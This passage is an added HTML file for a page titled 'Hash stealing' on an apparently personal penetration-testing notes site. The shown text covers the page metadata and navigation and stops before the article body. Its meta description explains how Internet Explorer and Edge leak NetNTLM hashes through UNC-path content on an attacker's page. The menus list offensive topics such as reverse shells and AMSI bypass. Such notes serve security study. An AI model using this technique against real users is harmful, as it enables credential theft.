@@ -1,0 +1,1770 @@
+<!doctype html>
+<html lang="en" data-bs-theme="auto">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><link rel="preload" href="http://localhost:1313/fonts/vendor/jost/jost-v4-latin-regular.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="http://localhost:1313/fonts/vendor/jost/jost-v4-latin-500.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="http://localhost:1313/fonts/vendor/jost/jost-v4-latin-700.woff2" as="font" type="font/woff2" crossorigin>
+<script 
+  src="/js/color-mode.f14b3e296de1d0b69e75af684b62a4a912a2cadab04e36123407cd8388204f1d.js"
+  integrity="sha256-8Us&#43;KW3h0Laeda9oS2KkqRKiytqwTjYSNAfNg4ggTx0=">
+</script>
+
+
+<link rel="stylesheet" href="/main.1542a5884e04a94d737f95f75653bbae5d9d951aeefab7705a9db5f7a85e58fed8b1c2f686c1303120bb66c4ac2cbfbf1317d05cde7d463eccc899dbb8088787.css" integrity="sha512-FUKliE4EqU1zf5X3VlO7rl2dlRru&#43;rdwWp2196heWP7YscL2hsEwMSC7ZsSsLL&#43;/ExfQXN59Rj7MyJnbuAiHhw==" crossorigin="anonymous">
+
+<noscript><style>img.lazyload { display: none; }</style></noscript><base href="http://localhost:1313/notes/ad/hash-stealing/">
+
+  <link rel="canonical" href="http://localhost:1313/notes/ad/hash-stealing/">
+
+
+<title>Hash stealing  |  P4V1C</title>
+<meta name="description" content="">
+
+    
+    <link rel="icon" href="/favicon.ico" sizes="32x32">
+    
+      <link rel="icon" href="/favicon.svg" type="image/svg+xml">
+    
+      <link
+        rel="apple-touch-icon"
+        href="/apple-touch-icon.png"
+        sizes="180x180"
+        type="image/png"
+      >
+      <link
+        rel="icon"
+        href="/favicon-192x192.png"
+        sizes="192x192"
+        type="image/png"
+      >
+      <link
+        rel="icon"
+        href="/favicon-512x512.png"
+        sizes="512x512"
+        type="image/png"
+      >
+<link rel="manifest" href="/manifest.webmanifest">
+
+<meta property="og:url" content="http://localhost:1313/notes/ad/hash-stealing/">
+  <meta property="og:site_name" content="P4V1C">
+  <meta property="og:title" content="Hash stealing">
+  <meta property="og:description" content="Internet Explorer &amp; Edge While the dir command can be used to leak hashes, it is not very convenient method for an attacker. A more likely scenario would be if the attacker entices the victim to visit the attacker’s website or open a specially crafted file. As is widely known, Internet Explorer can leak NetNTLM hashes to websites containing embedded content (eg, images, stylesheets) loaded from a UNC path. This also applies to Microsoft Edge, which can be abused in the same way. This can be tested using the following HTML:">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="notes">
+    <meta property="article:published_time" content="2023-09-07T16:06:50+02:00">
+    <meta property="article:modified_time" content="2023-09-07T16:06:50+02:00">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Hash stealing">
+  <meta name="twitter:description" content="Internet Explorer &amp; Edge While the dir command can be used to leak hashes, it is not very convenient method for an attacker. A more likely scenario would be if the attacker entices the victim to visit the attacker’s website or open a specially crafted file. As is widely known, Internet Explorer can leak NetNTLM hashes to websites containing embedded content (eg, images, stylesheets) loaded from a UNC path. This also applies to Microsoft Edge, which can be abused in the same way. This can be tested using the following HTML:">
+      <meta name="twitter:site" content="@getdoks">
+
+    
+    
+    <script type="application/ld+json">
+  {
+   "@context": "https://schema.org",
+   "@type": "BreadcrumbList",
+   "itemListElement": [
+     {
+       "@type": "ListItem",
+       "item": "http://localhost:1313/",
+       "name": "About Me",
+       "position": 1
+     },
+     {
+       "@type": "ListItem",
+       "item": "http://localhost:1313/notes/",
+       "name": "Notes",
+       "position": 2
+     },
+     {
+       "@type": "ListItem",
+       "item": "http://localhost:1313/notes/ad/",
+       "name": "Ad",
+       "position": 3
+     },
+     {
+       "@type": "ListItem",
+       "name": "Hash Stealing",
+       "position": 4
+     }
+   ]
+ }
+</script>
+
+
+
+
+
+</head>
+
+  
+  <body class="single section notes" data-bs-spy="scroll" data-bs-target="#toc" data-bs-root-margin="0px 0px -60%" data-bs-smooth-scroll="true" tabindex="0">
+    <div class="sticky-top">
+<header class="navbar navbar-expand-lg">
+  <div class="container-lg">
+  
+    <a class="navbar-brand me-auto me-lg-3" href="/">P4V1C</a>
+
+    
+    
+    <button type="button" id="searchToggleMobile" class="btn btn-link nav-link mx-2 d-lg-none" aria-label="Search website">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+        <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+        <circle cx="10" cy="10" r="7"></circle>
+        <line x1="21" y1="21" x2="15" y2="15"></line>
+      </svg>
+    </button>
+    
+    <button class="btn btn-link d-lg-none" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasNavSection" aria-controls="offcanvasNavSection" aria-label="Open section navigation menu">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-dots-vertical" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+        <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+        <path d="M12 12m-1 0a1 1 0 1 0 2 0a1 1 0 1 0 -2 0"></path>
+        <path d="M12 19m-1 0a1 1 0 1 0 2 0a1 1 0 1 0 -2 0"></path>
+        <path d="M12 5m-1 0a1 1 0 1 0 2 0a1 1 0 1 0 -2 0"></path>
+      </svg>
+    </button>
+    <div class="offcanvas offcanvas-start d-lg-none" tabindex="-1" id="offcanvasNavSection" aria-labelledby="offcanvasNavSectionLabel">
+      <div class="offcanvas-header">
+        <h5 class="offcanvas-title" id="offcanvasNavSectionLabel">Notes</h5>
+        <button type="button" class="btn btn-link nav-link p-0 ms-auto" data-bs-dismiss="offcanvas" aria-label="Close">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+            <path d="M18 6l-12 12"></path>
+            <path d="M6 6l12 12"></path>
+          </svg>
+        </button>
+      </div>
+      <div class="offcanvas-body">
+        <aside class="doks-sidebar mt-n3">
+          <nav id="doks-docs-nav" aria-label="Tertiary navigation">
+            
+  
+    
+<nav class="section-nav docs-links">
+  <ul class="list-unstyled">
+
+  <li>
+    <details open>
+      <summary>AD</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+    <details>
+      <summary>Local Privilege escalation</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/ad/local-privilege-escalation/linux-privesc/">Linux Privesc</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/local-privilege-escalation/windows-privesc/">windows-privesc</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Tools</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/ad/tools/bloodhound/">Bloodhound</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/evil-winrm/">Evil WinRm</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/firewall-evasion/">Firewall Evasion</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/impacket/">Impacket</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/netexec/">Netexec</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/powerview/">Powerview</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+      <a href="/notes/ad/ad-cs/">AD CS</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/av-amsi-bypass/">AV &amp; AMSI Bypass</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/c2/">C2</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/delegation/">Delegation</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/discovery/">Discovery</a>
+  </li>
+
+  <li class="active" >
+      <a aria-current="page" href="/notes/ad/hash-stealing/">Hash stealing</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/kerberoast-asreproast/">Kerberoast-Asreproast</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/krbrelaiup/">KrbRelaiUp</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/linux/">Linux</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/ntlm-relay/">Ntlm Relay</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/password-looting/">Password looting</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/phishing/">Phishing</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/pivot/">Pivot</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tickets/">Tickets</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/transfert/">Transfert</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/trust-attack/">Trust Attack</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Reverse Shell</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/shell-and-payload/bash/">Bash</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/msfvenom/">MsfVenom</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/netcat/">Netcat</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/nodejs/">Nodejs</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/php-monkey/">Php-Monkey</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/powershell/">Powershell</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/pownyshell/">PownyShell</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/python/">Python</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/upgrade/">Upgrade</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Webs</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/web/access-control/">Access Control</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/api-testing/">API Testing</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/authentication/">Authentication</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/command-injection/">Command Injection</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/deserialization/">Deserialization</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/file-upload/">File Upload</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/git/">Git</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/graphsql/">Graphsql</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/jwt/">JWT</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/path-traversal/">Path Traversal</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/race-conditon/">Race Conditon</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/ssrf/">SSRF</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/web-cache/">Web Cache</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/wordpress/">Wordpress</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/xss/">XSS</a>
+  </li>
+
+  <li>
+      <a href="/notes/web/xxe/">XXE</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Services</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/services/ftp/">FTP</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/iis/">IIS</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/ldap/">Ldap</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/mssql-mysql/">Mssql-Mysql</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/rpcbind/">RPCbind</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/rsync/">Rsync</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/rtsp/">RTSP</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/smtp/">SMTP</a>
+  </li>
+
+  <li>
+      <a href="/notes/services/snmp/">SNMP</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Labs</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+    <details>
+      <summary>HTB</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/lab/htb/analysis/">Analysis</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/caption/">Caption</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/certified/">Certified</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/cicada/">Cicada</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/hospital/">Hospital</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/infiltrator/">Infiltrator</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/perfection/">Perfection</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/htb/pov/">POV</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Vulnlab</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/lab/vulnlab/baby/">Baby</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/baby2/">Baby2</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/breach/">Breach</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/bruno/">Bruno</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/build/">Build</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/data/">Data</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/delegate/">Delegate</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/escape/">Escape</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/feedback/">Feedback</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/forgotten/">Forgotten</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/heron/">Heron</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/hybrid/">Hybrid</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/lock/">Lock</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/media/">Media</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/reflection/">Reflection</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/retro/">Retro</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/sendai/">Sendai</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/sync/">Sync</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/tea/">Tea</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/tengu/">Tengu</a>
+  </li>
+
+  <li>
+      <a href="/notes/lab/vulnlab/trusted/">Trusted</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Pwn-Reverse</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/pwn-reverse/android-emulation/">Android Emulation</a>
+  </li>
+
+  <li>
+    <details>
+      <summary>CTf</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/pwn-reverse/chall/introduction-to-the-geomyides/">Introduction to the Geomyides</a>
+  </li>
+
+  <li>
+      <a href="/notes/pwn-reverse/chall/keygen-me/">Keygen-Me</a>
+  </li>
+
+  <li>
+      <a href="/notes/pwn-reverse/chall/simple-encryptor/">Simple Encryptor</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Dev</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/code/bash/">Bash</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/c/">C</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/c-/">C&#43;&#43;</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/go/">Go</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/java/">Java</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/lua/">Lua</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/nodejs/">Nodejs</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/php/">Php</a>
+  </li>
+
+  <li>
+      <a href="/notes/code/ruby/">Ruby</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Ressources</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/ressources/arch-setup/">Arch-Setup</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/command-linux/">Command Linux</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/debian-setup/">Debian-Setup</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/kvm/">Kvm</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/link/">Link</a>
+  </li>
+
+  <li>
+      <a href="/notes/ressources/tmux/">Tmux</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Crypto</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/crypto/maths/">Maths</a>
+  </li>
+
+  <li>
+      <a href="/notes/crypto/scripting/">Scripting</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+  </ul>
+</nav>
+
+  
+
+          </nav>
+        </aside>
+      </div>
+    </div>
+    
+    <button class="btn btn-link nav-link mx-2 order-3 d-lg-none" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasNavMain" aria-controls="offcanvasNavMain" aria-label="Open main navigation menu">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-menu" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+        <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+        <line x1="4" y1="8" x2="20" y2="8"></line>
+        <line x1="4" y1="16" x2="20" y2="16"></line>
+      </svg>
+    </button>
+
+    
+    <div class="offcanvas offcanvas-end h-auto" tabindex="-1" id="offcanvasNavMain" aria-labelledby="offcanvasNavMainLabel">
+      <div class="offcanvas-header">
+        <h5 class="offcanvas-title" id="offcanvasNavMainLabel">P4V1C</h5>
+        <button type="button" class="btn btn-link nav-link p-0 ms-auto" data-bs-dismiss="offcanvas" aria-label="Close">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+            <path d="M18 6l-12 12"></path>
+            <path d="M6 6l12 12"></path>
+         </svg>
+        </button>
+      </div>
+      
+      <div class="offcanvas-body d-flex flex-column flex-lg-row justify-content-between">
+        <ul class="navbar-nav flex-grow-1"><li class="nav-item">
+                <a class="nav-link active" href="http://localhost:1313/notes/ad/ad-cs" aria-current="true">Notes</a>
+              </li>
+            <li class="nav-item">
+                <a class="nav-link" href="http://localhost:1313/blog/">Blog</a>
+              </li>
+            </ul>
+
+        
+        
+        <button type="button" id="searchToggleDesktop" class="btn btn-link nav-link p-2 d-none d-lg-block" aria-label="Search website">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+            <circle cx="10" cy="10" r="7"></circle>
+            <line x1="21" y1="21" x2="15" y2="15"></line>
+          </svg>
+        </button>
+        
+        
+        
+        <button id="buttonColorMode" class="btn btn-link mx-auto nav-link p-0 ms-lg-2 me-lg-1" type="button" aria-label="Toggle theme">
+          <svg data-bs-theme-value="dark" xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-moon" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+            <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z"></path>
+          </svg>
+          <svg data-bs-theme-value="light" xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-sun" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+            <path d="M12 12m-4 0a4 4 0 1 0 8 0a4 4 0 1 0 -8 0m-5 0h1m8 -9v1m8 8h1m-9 8v1m-6.4 -15.4l.7 .7m12.1 -.7l-.7 .7m0 11.4l.7 .7m-12.1 -.7l-.7 .7"></path>
+          </svg>
+        </button>
+        
+        <ul id="socialMenu" class="nav mx-auto flex-row order-lg-4">
+          <li class="nav-item">
+              <a class="nav-link social-link" href="https://github.com/thuliteio/doks"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"></path><path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5"></path></svg><small class="ms-2 visually-hidden">GitHub</small></a>
+            </li>
+          </ul>
+        
+        </div>
+    </div>
+
+    
+    </div>
+</header>
+</div>
+
+<div class="modal" id="searchModal" tabindex="-1" aria-labelledby="searchModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-fullscreen-md-down">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h1 class="modal-title fs-5 visually-hidden" id="searchModalLabel">Search</h1>
+        <button type="button" class="btn-close visually-hidden" data-bs-dismiss="modal" aria-label="Close"></button>
+        <div class="search-input flex-grow-1 d-none">
+          <form id="search-form" class="search-form" action="#" method="post" accept-charset="UTF-8" role="search">
+            <label for="query" class="visually-hidden">Search</label>
+            <div class="d-flex">
+              <input type="search" id="query" name="query" class="search-text form-control form-control-lg" placeholder="Search" aria-label="Search" maxlength="128" autocomplete="off">
+              <button type="button" class="btn btn-link text-decoration-none px-0 ms-3 d-md-none" data-bs-dismiss="modal" aria-label="Close">Cancel</button>
+            </div>
+          </form>
+        </div>
+      </div>
+      <div class="modal-body">
+        <p class="search-loading status message d-none mt-3 text-center">Loading search index…</p>
+        <p class="search-no-recent message d-none mt-3 text-center">No recent searches</p>
+        <p class="search-no-results message d-none mt-3 text-center">No results for "<strong><span class="query-no-results">Query here</span></strong>"</p>
+        <div id="searchResults" class="search-results"></div>
+        <template>
+          <article class="search-result list-view">
+            <div class="card my-3">
+              <div class="card-body">
+                <header>
+                  <h2 class="h5 title title-submitted mb-0"><a class="stretched-link text-decoration-none text-reset" href="#">Title here</a></h2>
+                  <div class="submitted d-none"><time class="created-date">Date here</time></div>
+                </header>
+                <div class="content">Summary here</div>
+              </div>
+            </div>
+          </article>
+        </template>
+      </div>
+      <div class="modal-footer">
+        <ul class="list-inline me-auto d-none d-md-block">
+          <li class="list-inline-item"><kbd class="me-2"><svg width="15" height="15" aria-label="Enter key" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M12 3.53088v3c0 1-1 2-2 2H4M7 11.53088l-3-3 3-3"></path></g></svg></kbd><span class="DocSearch-Label">to select</span></li>
+          <li class="list-inline-item"><kbd class="me-2"><svg width="15" height="15" aria-label="Arrow down" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 3.5v8M10.5 8.5l-3 3-3-3"></path></g></svg></kbd><kbd class="me-2"><svg width="15" height="15" aria-label="Arrow up" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 11.5v-8M10.5 6.5l-3-3-3 3"></path></g></svg></kbd><span class="DocSearch-Label">to navigate</span></li>
+          <li class="list-inline-item"><kbd class="me-2"><svg width="15" height="15" aria-label="Escape key" role="img"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M13.6167 8.936c-.1065.3583-.6883.962-1.4875.962-.7993 0-1.653-.9165-1.653-2.1258v-.5678c0-1.2548.7896-2.1016 1.653-2.1016.8634 0 1.3601.4778 1.4875 1.0724M9 6c-.1352-.4735-.7506-.9219-1.46-.8972-.7092.0246-1.344.57-1.344 1.2166s.4198.8812 1.3445.9805C8.465 7.3992 8.968 7.9337 9 8.5c.032.5663-.454 1.398-1.4595 1.398C6.6593 9.898 6 9 5.963 8.4851m-1.4748.5368c-.2635.5941-.8099.876-1.5443.876s-1.7073-.6248-1.7073-2.204v-.4603c0-1.0416.721-2.131 1.7073-2.131.9864 0 1.6425 1.031 1.5443 2.2492h-2.956"></path></g></svg></kbd><span class="DocSearch-Label">to close</span></li>
+        </ul>
+        <p class="d-md-none">Search by <a class="text-decoration-none" href="https://github.com/nextapps-de/flexsearch">FlexSearch</a></p>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+    <div class="wrap container-lg" role="document">
+      <div class="content">
+      
+        
+	<div class="row flex-xl-nowrap">
+		<div class="col-lg-5 col-xl-4 docs-sidebar d-none d-lg-block">
+			
+  
+    
+<nav class="section-nav docs-links">
+  <ul class="list-unstyled">
+
+  <li>
+    <details open>
+      <summary>AD</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+    <details>
+      <summary>Local Privilege escalation</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/ad/local-privilege-escalation/linux-privesc/">Linux Privesc</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/local-privilege-escalation/windows-privesc/">windows-privesc</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Tools</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/ad/tools/bloodhound/">Bloodhound</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/evil-winrm/">Evil WinRm</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/firewall-evasion/">Firewall Evasion</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/impacket/">Impacket</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/netexec/">Netexec</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tools/powerview/">Powerview</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+      <a href="/notes/ad/ad-cs/">AD CS</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/av-amsi-bypass/">AV &amp; AMSI Bypass</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/c2/">C2</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/delegation/">Delegation</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/discovery/">Discovery</a>
+  </li>
+
+  <li class="active" >
+      <a aria-current="page" href="/notes/ad/hash-stealing/">Hash stealing</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/kerberoast-asreproast/">Kerberoast-Asreproast</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/krbrelaiup/">KrbRelaiUp</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/linux/">Linux</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/ntlm-relay/">Ntlm Relay</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/password-looting/">Password looting</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/phishing/">Phishing</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/pivot/">Pivot</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/tickets/">Tickets</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/transfert/">Transfert</a>
+  </li>
+
+  <li>
+      <a href="/notes/ad/trust-attack/">Trust Attack</a>
+  </li>
+      </ul>
+    </details>
+  </li>
+
+  <li>
+    <details>
+      <summary>Reverse Shell</summary>
+      <ul class="list-unstyled list-nested">
+
+  <li>
+      <a href="/notes/shell-and-payload/bash/">Bash</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/msfvenom/">MsfVenom</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/netcat/">Netcat</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/nodejs/">Nodejs</a>
+  </li>
+
+  <li>
+      <a href="/notes/shell-and-payload/php-monkey/">Php-Monkey</a>
+  </li>
+
+  <li>
